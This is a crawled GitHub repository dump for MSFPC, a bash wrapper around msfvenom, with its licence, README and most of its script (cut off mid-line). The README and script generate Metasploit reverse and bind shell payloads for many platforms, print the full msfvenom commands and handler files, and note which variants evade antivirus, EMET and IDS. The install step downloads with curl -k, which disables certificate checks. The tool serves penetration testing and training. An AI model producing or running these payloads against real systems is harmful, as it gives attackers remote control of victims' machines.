{
  "metadata": {
    "timestamp": 1736568698227,
    "page": 787,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjc4OQ==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "g0tmi1k/msfpc",
      "stars": 1239,
      "defaultBranch": "master",
      "files": [
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.0498046875,
          "content": "The MIT License (MIT)\n\nCopyright (c) 2015 g0tmi1k\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 10.103515625,
          "content": "## MSFvenom Payload Creator (MSFPC)\n\nA **quick** way to generate various \"basic\" Meterpreter payloads via `msfvenom` (part of the Metasploit framework).\n\n<p align=\"center\">\n  <img src=\"http://i.imgur.com/rOqMdwp.png\" alt=\"msfpc logo\"/>\n</p>\n\n\n- - -\n\n\n## About\n\nMSFvenom Payload Creator (MSFPC) is a wrapper to generate multiple types of payloads, based on users choice. The idea is to be as **simple as possible** (**only requiring one input**) to produce their payload.\n\n**Fully automating** msfvenom & Metasploit is the end goal _(well as to be be able to automate MSFPC itself)_.\nThe rest is to make the user's life as **easy as possible** (e.g. **IP selection menu**, **msfconsole resource file/commands**, **batch payload production** and able to enter **any argument in any order** _(in various formats/patterns)_).\n\nThe only necessary input from the user should be **defining the payload** they want by either the **platform** (e.g. `windows`), or the **file extension** they wish the payload to have (e.g. `exe`).\n\n* **Can't remember your IP for a interface? Don't sweat it, just use the interface name**: `eth0`.\n* **Don't know what your external IP is? MSFPC will discover it**: `wan`.\n* **Want to generate one of each payload? No issue!** Try: `loop`.\n* **Want to mass create payloads? Everything? Or to filter your select? ..Either way, its not a problem**. Try: `batch` (for everything), `batch msf` (for every Meterpreter option), `batch staged` (for every staged payload), or `batch cmd stageless` (for every stageless command prompt)!\n\n_Note: This will **NOT** try to bypass any anti-virus solutions at any stage._\n\n![Msfvenom Payload Creator (MSFPC)](https://i.imgur.com/tN9q5iG.png)\n\n\n- - -\n\n\n## Install\n\n+ Designed for **Kali Linux v2.x/Rolling** & **Metasploit v4.11+**.\n+ Kali v1.x should work.\n+ OSX 10.11+ should work.\n+ Weakerth4n 6+ should work.\n+ _...nothing else has been tested._\n\n```\n$ curl -k -L \"https://raw.githubusercontent.com/g0tmi1k/mpc/master/msfpc.sh\" > /usr/local/bin/msfpc\n$ chmod 0755 /usr/local/bin/msfpc\n```\n\n### Kali-Linux\n\nMSFPC is already [packaged](https://pkg.kali.org/pkg/msfpc) in [Kali Rolling](https://www.kali.org/), so all you have to-do is:\n\n```bash\nroot@kali:~# apt install -y msfpc\n```\n\n\n\n- - -\n\n\n## Help\n\n```\n$ bash msfpc.sh -h -v\n [*] MSFvenom Payload Creator (MSFPC v1.4.4)\n\n msfpc.sh <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)\n   Example: msfpc.sh windows 192.168.1.10        # Windows & manual IP.\n            msfpc.sh elf bind eth0 4444          # Linux, eth0's IP & manual port.\n            msfpc.sh stageless cmd py https      # Python, stageless command prompt.\n            msfpc.sh verbose loop eth1           # A payload for every type, using eth1's IP.\n            msfpc.sh msf batch wan               # All possible Meterpreter payloads, using WAN IP.\n            msfpc.sh help verbose                # Help screen, with even more information.\n\n <TYPE>:\n   + APK\n   + ASP\n   + ASPX\n   + Bash [.sh]\n   + Java [.jsp]\n   + Linux [.elf]\n   + OSX [.macho]\n   + Perl [.pl]\n   + PHP\n   + Powershell [.ps1]\n   + Python [.py]\n   + Tomcat [.war]\n   + Windows [.exe // .dll]\n\n Rather than putting <DOMAIN/IP>, you can do a interface and MSFPC will detect that IP address.\n Missing <DOMAIN/IP> will default to the IP menu.\n\n Missing <PORT> will default to 443.\n\n <CMD> is a standard/native command prompt/terminal to interactive with.\n <MSF> is a custom cross platform shell, gaining the full power of Metasploit.\n Missing <CMD/MSF> will default to <MSF> where possible.\n   Note: Metasploit doesn't (yet!) support <CMD/MSF> for every <TYPE> format.\n <CMD> payloads are generally smaller than <MSF> and easier to bypass EMET. Limit Metasploit post modules/scripts support.\n <MSF> payloads are generally much larger than <CMD>, as it comes with more features.\n\n <BIND> opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target.\n <REVERSE> makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target.\n Missing <BIND/REVERSE> will default to <REVERSE>.\n <BIND> allows for the attacker to connect whenever they wish. <REVERSE> needs to the target to be repeatedly connecting back to permanent maintain access.\n\n <STAGED> splits the payload into parts, making it smaller but dependent on Metasploit.\n <STAGELESS> is the complete standalone payload. More 'stable' than <STAGED>.\n Missing <STAGED/STAGELESS> will default to <STAGED> where possible.\n   Note: Metasploit doesn't (yet!) support <STAGED/STAGELESS> for every <TYPE> format.\n <STAGED> are 'better' in low-bandwidth/high-latency environments.\n <STAGELESS> are seen as 'stealthier' when bypassing Anti-Virus protections. <STAGED> may work 'better' with IDS/IPS.\n More information: https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads\n                   https://www.offensive-security.com/metasploit-unleashed/payload-types/\n                   https://www.offensive-security.com/metasploit-unleashed/payloads/\n\n <TCP> is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs.\n <HTTP> makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80.\n <HTTPS> makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443.\n <FIND_PORT> will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on <TYPE>.\n Missing <TCP/HTTP/HTTPS/FIND_PORT> will default to <TCP>.\n By altering the traffic, such as <HTTP> and even more <HTTPS>, it will slow down the communication & increase the payload size.\n More information: https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication\n\n <BATCH> will generate as many combinations as possible: <TYPE>, <CMD + MSF>, <BIND + REVERSE>, <STAGED + STAGLESS> & <TCP + HTTP + HTTPS + FIND_PORT>\n <LOOP> will just create one of each <TYPE>.\n\n <VERBOSE> will display more information.\n$\n```\n\n\n## Example \\#1 (Windows, Fully Automated Using Manual IP)\n\n```bash\n$ bash msfpc.sh windows 192.168.1.10\n [*] MSFvenom Payload Creator (MSFPC v1.4.4)\n [i]   IP: 192.168.1.10\n [i] PORT: 443\n [i] TYPE: windows (windows/meterpreter/reverse_tcp)\n [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f exe \\\n  --platform windows -a x86 -e generic/none LHOST=192.168.1.10 LPORT=443 \\\n  > '/root/windows-meterpreter-staged-reverse-tcp-443.exe'\n\n [i] windows meterpreter created: '/root/windows-meterpreter-staged-reverse-tcp-443.exe'\n\n [i] MSF handler file: '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'\n [i] Run: msfconsole -q -r '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'\n [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080\n [*] Done!\n$\n```\n\n\n## Example \\#2 (Linux Format, Fully Automated Using Manual Interface and Port)\n\n```bash\n$ ./msfpc.sh elf bind eth0 4444 verbose\n [*] MSFvenom Payload Creator (MSFPC v1.4.4)\n [i]        IP: 192.168.103.142\n [i]      PORT: 4444\n [i]      TYPE: linux (linux/x86/shell/bind_tcp)\n [i]     SHELL: shell\n [i] DIRECTION: bind\n [i]     STAGE: staged\n [i]    METHOD: tcp\n [i]       CMD: msfvenom -p linux/x86/shell/bind_tcp -f elf \\\n  --platform linux -a x86 -e generic/none  LPORT=4444 \\\n  > '/root/linux-shell-staged-bind-tcp-4444.elf'\n\n [i] linux shell created: '/root/linux-shell-staged-bind-tcp-4444.elf'\n\n [i] File: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, corrupted section header size\n [i] Size: 4.0K\n [i]  MD5: eed4623b765eea623f2e0206b63aad61\n [i] SHA1: 0b5dabd945ef81ec9283768054b3c22125aa9185\n\n [i] MSF handler file: '/root/linux-shell-staged-bind-tcp-4444-elf.rc'\n [i] Run: msfconsole -q -r '/root/linux-shell-staged-bind-tcp-4444-elf.rc'\n [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080\n [*] Done!\n$\n```\n\n\n## Example \\#3 (Python Format, Interactive IP Menu)\n\n```bash\n$ msfpc stageless cmd py tcp\n [*] MSFvenom Payload Creator (MSFPC v1.4.4)\n\n [i] Use which interface - IP address?:\n [i]   1.) eth0 - 192.168.103.142\n [i]   2.) lo - 127.0.0.1\n [i]   3.) wan - 31.204.154.174\n [?] Select 1-3, interface or IP address: 1\n\n [i]   IP: 192.168.103.142\n [i] PORT: 443\n [i] TYPE: python (python/shell_reverse_tcp)\n [i]  CMD: msfvenom -p python/shell_reverse_tcp -f raw \\\n  --platform python -e generic/none -a python LHOST=192.168.103.142 LPORT=443 \\\n  > '/root/python-shell-stageless-reverse-tcp-443.py'\n\n [i] python shell created: '/root/python-shell-stageless-reverse-tcp-443.py'\n\n [i] MSF handler file: '/root/python-shell-stageless-reverse-tcp-443-py.rc'\n [i] Run: msfconsole -q -r '/root/python-shell-stageless-reverse-tcp-443-py.rc'\n [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080\n [*] Done!\n$\n```\n\n_Note: Removed WAN IP._\n\n\n## Example \\#4 (Loop - Generates one of everything)\n\n```bash\n$ ./msfpc.sh loop wan\n [*] MSFvenom Payload Creator (MSFPC v1.4.4)\n [i] Loop Mode. Creating one of each TYPE, with default values\n\n [*] MSFvenom Payload Creator (MSFPC v1.4.4)\n [i]   IP: xxx.xxx.xxx.xxx\n [i] PORT: 443\n [i] TYPE: android (android/meterpreter/reverse_tcp)\n [i]  CMD: msfvenom -p android/meterpreter/reverse_tcp \\\n  LHOST=xxx.xxx.xxx.xxx LPORT=443 \\\n  > '/root/android-meterpreter-stageless-reverse-tcp-443.apk'\n\n [i] android meterpreter created: '/root/android-meterpreter-stageless-reverse-tcp-443.apk'\n\n [i] MSF handler file: '/root/android-meterpreter-stageless-reverse-tcp-443-apk.rc'\n [i] Run: msfconsole -q -r '/root/android-meterpreter-stageless-reverse-tcp-443-apk.rc'\n [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080\n [*] Done!\n\n\n [*] MSFvenom Payload Creator (MSFPC v1.4.4)\n\n...SNIP...\n\n [*] Done!\n\n$\n```\n\n_Note: Removed WAN IP._\n\n\n![Examples](https://i.imgur.com/8zPx6p3.png)\n\n\n- - -\n\n\n## To-Do List\n\n* Shellcode generation\n* x64 payloads\n* IPv6 support\n* Look into using OS scripting more _(`powershell_bind_tcp` & `bind_perl` etc)_\n"
        },
        {
          "name": "msfpc.sh",
          "type": "blob",
          "size": 42.74609375,
          "content": "#!/bin/bash\n#-Metadata----------------------------------------------------#\n#  Filename: msfpc.sh (v1.4.5)           (Update: 2019-02-18) #\n#-Info--------------------------------------------------------#\n#  Quickly generate Metasploit payloads using msfvenom.       #\n#-Author(s)---------------------------------------------------#\n#  g0tmilk ~ https://blog.g0tmi1k.com/                        #\n#-Operating System--------------------------------------------#\n#  Designed for & tested on: Kali Rolling & Metasploit v4.11+ #\n#          Reported working: OSX 10.11+ & Kali Linux 1.x/2.x  #\n#-Licence-----------------------------------------------------#\n#  MIT License ~ http://opensource.org/licenses/MIT           #\n#-Notes-------------------------------------------------------#\n#  Requires:                                                  #\n#    Metasploit Framework v4.11.3-2015062101 or higher        #\n#                             ---                             #\n#  Useful Manual Commands:                                    #\n#    msfvenom --list payloads                                 #\n#    msfvenom --list encoders                                 #\n#    msfvenom --help-formats                                  #\n#                             ---                             #\n#  Reminder about payload names:                              #\n#    shell_bind_tcp - Single / Inline / NonStaged / Stageless #\n#    shell/bind_tcp - Staged (Requires Metasploit)            #\n#-Known Bugs--------------------------------------------------#\n# [BATCH/LOOP] The script must have the executable flag set   #\n# [BATCH] Will not generate DLL files                         #\n#-------------------------------------------------------------#\n\n#--Quick Install----------------------------------------------#\n#  curl -k -L \"https://raw.githubusercontent.com/g0tmi1k/msfpc/master/msfpc.sh\" > /usr/bin/msfpc; chmod +x /usr/bin/msfpc\n#-------------------------------------------------------------#\n\n#-More information--------------------------------------------#\n#   - https://www.offensive-security.com/metasploit-unleashed/payloads/\n#   - https://www.offensive-security.com/metasploit-unleashed/payload-types/\n#   - https://www.offensive-security.com/metasploit-unleashed/msfvenom/\n#   - https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads\n#   - https://community.rapid7.com/community/metasploit/blog/2011/05/24/introducing-msfvenom\n#   - https://community.rapid7.com/community/metasploit/blog/2014/12/09/good-bye-msfpayload-and-msfencode\n#   - https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom\n#-------------------------------------------------------------#\n\n\n#-Defaults----------------------------------------------------#\n\n\n##### Variables\nOUTPATH=\"$( pwd )/\"      # Others: ./   /tmp/   /var/www/\n\n##### (Cosmetic) Colour output\nRED=\"\\033[01;31m\"      # Issues/Errors\nGREEN=\"\\033[01;32m\"    # Success/Asking for Input\nYELLOW=\"\\033[01;33m\"   # Warnings/Information\nBLUE=\"\\033[01;34m\"     # Heading\nBOLD=\"\\033[01;01m\"     # Highlight\nRESET=\"\\033[00m\"       # Normal\n\n##### Read command line arguments\nTYPE=\"\"                #\"$( echo ${1} | \\tr '[:upper:]' '[:lower:]' )\" Defalut: *REQUIRED*\nIP=\"\"                  #\"${2}\"                                         Defalut: *IP menu*\nPORT=\"\"                #\"${3}\"                                         Deafult: 443\nSHELL=\"\"               # shell // meterpreter                          Default: meterpreter\nDIRECTION=\"\"           # reverse // bind                               Default: reverse\nSTAGE=\"\"               # staged // stageless                           Default: stageless\nMETHOD=\"\"              # tcp // http // https // find_port             Default: tcp\nVERBOSE=false\n\n##### Default values\nSUCCESS=false          # Did we successfully create a payload?\nDOMAIN=false           # IP address or domain name?\nBATCH=false            # Are we creating multiple payloads (one of each type) ?\nLOOP=false             # Are we creating multiple payloads (every possible combination)?\nHELP=false             # Display the help screen?\nDARWIN=false           # In case of OSX users\n\n##### (Optional) Enable debug mode?\n#set -x\n\n\n#-Function----------------------------------------------------#\n\n## doAction TYPE IP PORT PAYLOAD CMD FILEEXT SHELL DIRECTION STAGE METHOD VERBOSE\nfunction doAction {\n  TYPE=\"${1}\"\n  IP=\"${2}\"\n  PORT=\"${3}\"\n  PAYLOAD=\"${4}\"\n  CMD=\"${5}\"\n  FILEEXT=\"${6%-service}\"\n  SHELL=\"${7}\"\n  DIRECTION=\"${8}\"\n  STAGE=\"${9}\"\n  METHOD=\"${10}\"\n  VERBOSE=\"${11}\"\n\n  if [[ -z \"${VERBOSE}\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} ${RED}Something went wrong (Internally)${RESET}:   doAction TYPE(${TYPE}) IP(${IP}) PORT(${PORT}) PAYLOAD(${PAYLOAD}) CMD(${CMD}) FILEEXT(${FILEEXT}) SHELL(${SHELL}) DIRECTION(${DIRECTION}) STAGE(${STAGE}) METHOD(${METHOD}) VERBOSE(${VERBOSE})\" >&2\n    exit 2\n  fi\n\n  FILENAME=\"${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}\"\n  FILEHANDLE=\"${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}-${FILEEXT}.rc\"\n\n  X=\"  IP\"\n  [[ \"${DOMAIN}\" == \"true\" ]] \\\n    && X='NAME'\n  [[ \"${VERBOSE}\" == \"true\" ]] \\\n    && PADDING='     '\n\n  echo -e \" ${YELLOW}[i]${RESET}${PADDING} ${X}: ${YELLOW}${IP}${RESET}\"\n  echo -e \" ${YELLOW}[i]${RESET}${PADDING} PORT: ${YELLOW}${PORT}${RESET}\"\n  echo -e \" ${YELLOW}[i]${RESET}${PADDING} TYPE: ${YELLOW}${TYPE}${RESET} (${PAYLOAD})\"\n  if [[ \"${VERBOSE}\" == \"true\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET}     SHELL: ${YELLOW}${SHELL}${RESET}\"\n    echo -e \" ${YELLOW}[i]${RESET} DIRECTION: ${YELLOW}${DIRECTION}${RESET}\"\n    echo -e \" ${YELLOW}[i]${RESET}     STAGE: ${YELLOW}${STAGE}${RESET}\"\n    echo -e \" ${YELLOW}[i]${RESET}    METHOD: ${YELLOW}${METHOD}${RESET}\"\n  fi\n  echo -e \" ${YELLOW}[i]${RESET}${PADDING}  CMD: ${BOLD}${CMD}${RESET}\"\n  echo \"\"\n\n  CMD=$( echo $CMD | sed 's/\\\\\\\\\\n//g' )\n\n  [[ -e \"${FILENAME}\" ]] \\\n    && echo -e \" ${YELLOW}[i]${RESET} File (${FILENAME}) ${YELLOW}already exists${RESET}. ${YELLOW}Overwriting...${RESET}\" \\\n    && rm -f \"${FILENAME}\"\n  eval \"${CMD}\" 2>/tmp/msfpc.out\n  [[ ! -s \"${FILENAME}\" ]] \\\n    && rm -f \"${FILENAME}\"\n  if [[ -e \"${FILENAME}\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} ${TYPE} ${SHELL} created: '${YELLOW}${FILENAME}${RESET}'\"\n    echo \"\"\n    \\chmod +x \"${FILENAME}\"\n  else\n    echo \"\"\n    \\grep -q 'Invalid Payload Selected' /tmp/msfpc.out 2>/dev/null\n    if [[ \"$?\" == '0'  ]]; then\n      echo -e \"\\n ${YELLOW}[i]${RESET} ${RED}Invalid Payload Selected${RESET} (Metasploit doesn't support this) =(\" >&2\n      \\rm -f /tmp/msfpc.out\n    else\n      echo -e \"\\n ${YELLOW}[i]${RESET} Something went wrong. ${RED}Issue creating file${RESET} =(.\" >&2\n      echo -e \"\\n----------------------------------------------------------------------------------------\"\n      [ -e \"/usr/share/metasploit-framework/build_rev.txt\" ] \\\n        && \\cat /usr/share/metasploit-framework/build_rev.txt \\\n        || \\msfconsole -v\n      \\uname -a\n      echo -e \"----------------------------------------------------------------------------------------${RED}\"\n      \\cat /tmp/msfpc.out\n      echo -e \"${RESET}----------------------------------------------------------------------------------------\\n\"\n    fi\n    exit 2\n  fi\n  #\\rm -f /tmp/msfpc.out\n\n  if [[ \"${VERBOSE}\" == \"true\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} File: $( \\file -b ${FILENAME} )\"\n    echo -e \" ${YELLOW}[i]${RESET} Size: $( \\du -h ${FILENAME} | \\cut -f1 )\"\n    echo -e \" ${YELLOW}[i]${RESET}  MD5: $( \\openssl md5 ${FILENAME} | \\awk '{print $2}' )\"\n    echo -e \" ${YELLOW}[i]${RESET} SHA1: $( \\openssl sha1 ${FILENAME} | \\awk '{print $2}' )\"\n    echo -e \"\"\n  fi\n\n  HOST=\"LHOST\"\n  [[ \"${DIRECTION}\" == \"bind\" ]] \\\n    && HOST=\"RHOST\"\n\n  cat <<EOF > \"${FILEHANDLE}\"\n#\n# [Kali]: msfdb start; msfconsole -q -r '${FILEHANDLE}'\n#\nuse exploit/multi/handler\nset PAYLOAD ${PAYLOAD}\nset ${HOST} ${IP}\nset LPORT ${PORT}\nset ExitOnSession false\nset EnableStageEncoding true\n#set AutoRunScript 'post/windows/manage/migrate'\nrun -j\nEOF\n\n  echo -e \" ${YELLOW}[i]${RESET} MSF handler file: '${FILEHANDLE}'\"\n  echo -e \" ${YELLOW}[i]${RESET} Run: msfconsole -q -r '${FILEHANDLE}'\"\n  #echo -e \" ${YELLOW}[i]${RESET} MSF command: msfconsole -x \\\"use exploit/multi/handler; \\\\\\\\\\n  set PAYLOAD ${PAYLOAD}; \\\\\\\\\\n  set ${HOST} ${IP}; \\\\\\\\\\n  set LPORT ${PORT}; \\\\\\\\\\n  set ExitOnSession false; \\\\\\\\\\n  run -j\\\"\"\n  SUCCESS=true\n  return\n}\n\n## doHelp\nfunction doHelp {\n  echo -e \"\\n ${BLUE}${0}${RESET} <${BOLD}TYPE${RESET}> (<${BOLD}DOMAIN/IP${RESET}>) (<${BOLD}PORT${RESET}>) (<${BOLD}CMD/MSF${RESET}>) (<${BOLD}BIND/REVERSE${RESET}>) (<${BOLD}STAGED/STAGELESS${RESET}>) (<${BOLD}TCP/HTTP/HTTPS/FIND_PORT${RESET}>) (<${BOLD}BATCH/LOOP${RESET}>) (<${BOLD}VERBOSE${RESET}>)\"\n  echo -e \"   Example: ${BLUE}${0} windows 192.168.1.10${RESET}        # Windows & manual IP.\"\n  echo -e \"            ${BLUE}${0} elf bind eth0 4444${RESET}          # Linux, eth0's IP & manual port.\"\n  echo -e \"            ${BLUE}${0} stageless cmd py https${RESET}      # Python, stageless command prompt.\"\n  echo -e \"            ${BLUE}${0} verbose loop eth1${RESET}           # A payload for every type, using eth1's IP.\"\n  echo -e \"            ${BLUE}${0} msf batch wan${RESET}               # All possible Meterpreter payloads, using WAN IP.\"\n  echo -e \"            ${BLUE}${0} help verbose${RESET}                # Help screen, with even more information.\"\n  echo \"\"\n  echo -e \" <${BOLD}TYPE${RESET}>:\"\n  echo -e \"   + ${YELLOW}APK${RESET}\"\n  echo -e \"   + ${YELLOW}ASP${RESET}\"\n  echo -e \"   + ${YELLOW}ASPX${RESET}\"\n  echo -e \"   + ${YELLOW}Bash${RESET} [.${YELLOW}sh${RESET}]\"\n  echo -e \"   + ${YELLOW}Java${RESET} [.${YELLOW}jsp${RESET}]\"\n  echo -e \"   + ${YELLOW}Linux${RESET} [.${YELLOW}elf${RESET}]\"\n  echo -e \"   + ${YELLOW}OSX${RESET} [.${YELLOW}macho${RESET}]\"\n  echo -e \"   + ${YELLOW}Perl${RESET} [.${YELLOW}pl${RESET}]\"\n  echo -e \"   + ${YELLOW}PHP${RESET}\"\n  echo -e \"   + ${YELLOW}Powershell${RESET} [.${YELLOW}ps1${RESET}]\"\n  echo -e \"   + ${YELLOW}Python${RESET} [.${YELLOW}py${RESET}]\"\n  echo -e \"   + ${YELLOW}Tomcat${RESET} [.${YELLOW}war${RESET}]\"\n  echo -e \"   + ${YELLOW}Windows${RESET} [.${YELLOW}exe${RESET} // .${YELLOW}exe-service${RESET} // .${YELLOW}dll${RESET}]\"\n  echo \"\"\n  echo -e \" Rather than putting <DOMAIN/IP>, you can do a interface and MSFPC will detect that IP address.\"\n  echo -e \" Missing <DOMAIN/IP> will default to the IP menu.\"\n  echo \"\"\n  echo -e \" Missing <PORT> will default to 443.\"\n  echo \"\"\n  echo -e \" <CMD> is a standard/native command prompt/terminal to interactive with.\"\n  echo -e \" <MSF> is a custom cross platform shell, gaining the full power of Metasploit.\"\n  echo -e \" Missing <CMD/MSF> will default to <MSF> where possible.\"\n  if [[ \"${VERBOSE}\" == \"true\" ]]; then\n    echo -e \"   Note: Metasploit doesn't (yet!) support <CMD/MSF> for every <TYPE> format.\"\n    echo -e \" <CMD> payloads are generally smaller than <MSF> and easier to bypass EMET. Limit Metasploit post modules/scripts support.\"\n    echo -e \" <MSF> payloads are generally much larger than <CMD>, as it comes with more features.\"\n  fi\n  echo \"\"\n  echo -e \" <BIND> opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target.\"\n  echo -e \" <REVERSE> makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target.\"\n  echo -e \" Missing <BIND/REVERSE> will default to <REVERSE>.\"\n  [[ \"${VERBOSE}\" == \"true\" ]] \\\n    && echo -e \" <BIND> allows for the attacker to connect whenever they wish. <REVERSE> needs to the target to be repeatedly connecting back to permanent maintain access.\"\n  echo \"\"\n  echo -e \" <STAGED> splits the payload into parts, making it smaller but dependent on Metasploit.\"\n  echo -e \" <STAGELESS> is the complete standalone payload. More 'stable' than <STAGED>.\"\n  echo -e \" Missing <STAGED/STAGELESS> will default to <STAGED> where possible.\"\n  if [[ \"${VERBOSE}\" == \"true\" ]]; then\n    echo -e \"   Note: Metasploit doesn't (yet!) support <STAGED/STAGELESS> for every <TYPE> format.\"\n    echo -e \" <STAGED> are 'better' in low-bandwidth/high-latency environments.\"\n    echo -e \" <STAGELESS> are seen as 'stealthier' when bypassing Anti-Virus protections. <STAGED> may work 'better' with IDS/IPS.\"\n    echo -e \" More information: https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads\"\n    echo -e \"                   https://www.offensive-security.com/metasploit-unleashed/payload-types/\"\n    echo -e \"                   https://www.offensive-security.com/metasploit-unleashed/payloads/\"\n  fi\n  echo \"\"\n  echo -e \" <TCP> is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs.\"\n  echo -e \" <HTTP> makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80.\"\n  echo -e \" <HTTPS> makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443.\"\n  echo -e \" <FIND_PORT> will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on <TYPE>.\"\n  echo -e \" Missing <TCP/HTTP/HTTPS/FIND_PORT> will default to <TCP>.\"\n  if [[ \"${VERBOSE}\" == \"true\" ]]; then\n    echo -e \" By altering the traffic, such as <HTTP> and even more <HTTPS>, it will slow down the communication & increase the payload size.\"\n    echo -e \" More information: https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication\"\n  fi\n  echo \"\"\n  echo -e \" <BATCH> will generate as many combinations as possible: <TYPE>, <CMD + MSF>, <BIND + REVERSE>, <STAGED + STAGELESS> & <TCP + HTTP + HTTPS + FIND_PORT> \"\n  echo -e \" <LOOP> will just create one of each <TYPE>.\"\n  echo \"\"\n  echo -e \" <VERBOSE> will display more information.\"\n  exit 1\n}\n\n\n#-Start-------------------------------------------------------#\n\n\n## Banner\necho -e \" ${BLUE}[*]${RESET} ${BLUE}MSF${RESET}venom ${BLUE}P${RESET}ayload ${BLUE}C${RESET}reator (${BLUE}MSFPC${RESET} v${BLUE}1.4.5${RESET})\"\n\n\n## Check system\n## Are we using Linux or OSX?\nif [[ \"$( \\uname )\" != \"Linux\" ]] && [[ \"$( \\uname )\" != \"Darwin\" ]]; then\n  echo -e \" ${YELLOW}[i]${RESET} Something went wrong. ${RED}You're not using Unix-like OS${RESET}\" >&2\n  exit 3\nelif [[ \"$( \\uname )\" = \"Darwin\" ]]; then\n  DARWIN=true\nfi\n\n## msfvenom installed?\nif [[ ! -n \"$( \\which msfvenom )\" ]]; then\n  echo -e \" ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't find msfvenom${RESET}\" >&2\n  exit 3\nfi\n\n## cURL/wget installed?\nif [[ -n \"$( \\which curl )\" || -n \"$( \\which wget )\" ]]; then\n  ## Try and get external IP\n  WAN=\"\"\n  [[ -n \"$( \\which curl )\" ]] \\\n    && CMD=\"\\curl -s --max-time 3\" \\\n    || CMD=\"\\wget -U 'curl' --connect-timeout 3 -qO-\"\n  for url in 'http://ipinfo.io/ip' 'http://ifconfig.io/'; do\n    WAN=$( eval ${CMD} \"${url}\" )\n    [[ -n \"${WAN}\" ]] \\\n      && break\n  done\n  [[ \"${VERBOSE}\" == \"true\" && -z \"${WAN}\" ]] \\\n    && echo -e \" ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't get external WAN IP${RESET}\" >&2\nfi\n\n## Is there a writeable path for us?\nif [[ ! -d \"${OUTPATH}\" ]]; then\n  echo -e \" ${YELLOW}[i]${RESET} Something went wrong. ${RED}Unable to use ${OUTPATH}${RESET}\" >&2\n  exit 3\nfi\n\n\n## Get default values (before batch/loop)\n[[ -z \"${PORT}\" ]] \\\n  && PORT=\"443\"\n\n## Get NIC information\nif [[ \"$DARWIN\" = \"true\" ]]; then   # OSX users\n  IFACE=( $( for IFACE in $( \\ifconfig -l -u | \\tr ' ' '\\n' ); do if ( \\ifconfig ${IFACE} | \\grep inet 1>/dev/null ); then echo ${IFACE}; fi; done ) )\n  IPs=(); for (( i=0; i<${#IFACE[@]}; ++i )); do IPs+=( $( \\ifconfig \"${IFACE[${i}]}\" | \\grep 'inet ' | \\grep -E '([[:digit:]]{1,2}.){4}' | \\sed -e 's_[:|addr|inet]__g; s_^[ \\t]*__' | \\awk '{print $1}' ) ); done\nelse    # nix users\n  IFACE=( $( \\awk '/:/ {print $1}' /proc/net/dev | \\sed 's_:__' ) )\n  IPs=(); for (( i=0; i<${#IFACE[@]}; ++i )); do IPs+=( $( \\ip addr list \"${IFACE[${i}]}\" | \\grep 'inet ' | \\cut -d' ' -f6 | \\cut 